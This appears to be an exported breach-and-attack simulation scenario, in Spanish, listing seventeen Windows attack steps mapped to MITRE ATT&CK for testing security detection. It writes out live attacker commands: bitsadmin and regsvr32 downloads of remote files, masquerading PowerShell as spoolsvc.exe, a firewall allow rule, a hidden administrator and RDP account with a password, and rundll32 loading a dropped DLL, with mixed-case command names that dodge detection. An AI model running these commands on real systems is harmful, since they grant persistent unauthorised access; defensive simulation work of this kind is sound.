# 2026-PA-P2-Windows-Baseline-v01

| | |
|---|---|
| **Status** | active |
| **Severity** | medium |
| **Tags** | `windowsbaseline` · `preparacionactiva` · `2026` · `windows` |
| **Autor** | Enddy Emmanuel Figueroa Perez |
| **Creado** | 2026-06-03T00:54:22.680Z |
| **Actualizado** | 2026-06-03T16:05:42.061Z |

## Descripción

El escenario Windows Baseline P2 es una simulacion BAS desarrollada por el equipo de Respuesta a Incidentes de Devel Group, basada en tacticas, tecnicas y procedimientos (TTPs) comunmente observados en ataques reales contra sistemas Microsoft Windows. Este escenario integra un conjunto representativo de tecnicas utilizadas por actores maliciosos para comprometer estos entornos, con el proposito de evaluar la eficacia de las soluciones de seguridad en la deteccion, prevencion y respuesta ante actividades maliciosas, incluyendo la ejecucion y eliminacion de malware escrito en disco.

## Steps

### 1. BITS Jobs: T1197

**MITRE:** T1197

```cmd
cmd /c bitsadmIN /create BackupJob
```

### 2. Ingress Tool Transfer: T1105

**MITRE:** T1105

```cmd
cmd /c bitsadmIN /addfile BackupJob https://i.ytimg.com/vi/RkzhZsf4Dro/hqdefault.jpg C:\Windows\Temp\image.jpg.exe
```

### 3. Regsvr32: T1218.010

**MITRE:** T1218.010

```cmd
cmd /c regsVR32 /n /s /u /i:https://127.0.0.1/toolkit.exe scrobj.dll
```

### 4. Visual Basic: T1059.005

**MITRE:** T1059.005

```cmd
cmd /c wscRIpt.exe //B //E:vbscript "CreateObject("Wscript.Shell").Run "cmd.exe""
```

### 5. Local Account: T1087.001

**MITRE:** T1087.001

```powershell
Invoke-Command -ScriptBlock { Get-LocalUser }
```

### 6. SMB/Windows Admin Shares: T1021.002

**MITRE:** T1021.002

```powershell
Invoke-Command -ScriptBlock { Get-SmbShare }
```

### 7. Rename Legitimate Utilities: T1036.003

**MITRE:** T1036.003

```cmd
cmd /c coPy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\spoolsvc.exe
```

### 8. Disable or Modify System Firewall: T1562.004

**MITRE:** T1686

```cmd
cmd /c netSh advfirewall firewall add rule name="RemoteConfig" dir=in action=allow program="C:\Windows\Temp\spoolsvc.exe" enable=yes
```

### 9. Remote System Discovery: T1018

**MITRE:** T1018

```cmd
cmd /c nlTEST /domain_trusts
```

### 10. Local Account: T1136.001

**MITRE:** T1136.001

```cmd
cmd /c nEt uSer /add "admin365" "@ban20dd283s"
```

### 11. Additional Local or Domain Groups: T1098.007

**MITRE:** T1098.007

```cmd
cmd /c nEt locAlgroup Administrators admin365 /add
```

### 12. Additional Local or Domain Groups: T1098.007

**MITRE:** T1098.007

```powershell
Invoke-Command -ScriptBlock { Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'admin365' -ErrorAction SilentlyContinue }
```

### 13. System Information Discovery: T1082

**MITRE:** T1082

```cmd
cmd /c SYSTEMINFO
```

### 14. System Network Configuration Discovery: T1016

**MITRE:** T1016

```cmd
cmd /c ipCONFIG /all
```

### 15. Process Discovery: T1057

**MITRE:** T1057

```cmd
cmd /c tasKlist | findstr /I cytray.exe
```

### 16. Descarga de DLL advapi32.dll

```
downloader --src VFS:/shared/FileTest/advapi32_bening_testsimulation.dll --dest C:\Windows\Temp\advapy32.dll
```

### 17. Rundll32: T1218.011

**MITRE:** T1218.011

```cmd
RUNDLL32.exe C:\Windows\Temp\advapy32.dll
```

---
_Exportado desde STRIKE — `windowsbaselinep2v1`_
